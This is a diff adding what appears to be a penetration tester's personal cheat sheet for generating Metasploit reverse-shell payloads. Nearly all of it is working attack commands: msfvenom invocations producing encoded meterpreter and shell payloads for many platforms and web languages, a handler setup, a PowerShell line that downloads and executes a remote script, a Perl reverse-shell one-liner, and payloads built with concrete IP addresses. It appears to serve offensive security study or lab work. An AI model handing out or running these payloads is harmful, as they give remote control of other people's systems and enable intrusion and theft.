@@ -1,0 +1,124 @@
+METASPLOIT - REVERSE_SHELLS
+
+
+Creating Metasploit Payloads
+
+msfvenom -l
+
+Binaries
+
+Powershell
+
+msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://10.10.14.7:80/chatterbox.ps1')\""
+
+Raspberry Pi Shells
+
+msfvenom -p linux/armle/meterpreter_reverse_https LHOST=192.168.0.31 LPORT=8443
+
+Linux
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf 
+
+Windows
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+
+Mac
+
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
+
+Web Payloads
+
+PHP
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.30.53 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+ASP
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f asp > shell.asp
+
+JSP
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f raw > shell.jsp
+
+WAR
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f war > shell.war
+
+Scripting Payloads
+
+Python
+
+msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f raw > shell.py
+
+Bash
+
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f raw > shell.sh
+
+Perl
+
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f raw > shell.pl
+
+Shellcode
+
+For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
+
+Linux Based Shellcode
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f <language>
+
+Windows Based Shellcode
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f <language>
+
+Mac Based Shellcode
+
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -b "\x00" -e x86/shikata_ga_nai -f <language>
+
+Handlers
+
+Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
+
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
+
+
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.101 LPORT=3333 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+
+
+Perl one liner
+
+perl -e 'use Socket;$i="192.168.139.100";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+--------------------------------------------------
+
+actual shells made
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.53 LPORT=443 -f asp > Desktop/shells/win-rev-met-443-shell.asp
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.53 LPORT=4444 -f exe > Desktop/shells/win-rev-met-4444-shell.exe
+
+
+
+Staged Payloads                                                    Stageless Payloads
+
+windows/meterpreter/reverse_tcp         windows/meterpreter_reverse_tcp   
+
+windows/meterpreter/reverse_https         windows/meterpreter_reverse_https  
+
+windows/meterpreter/reverse_tcp         windows/meterpreter_reverse_tcp  
+
+
+msfvenom -p windows/meterpreter_reverse_https LHOST=192.168.0.16 LPORT=8443 -f psh > test.ps1
+
+
+
+
+
+
+
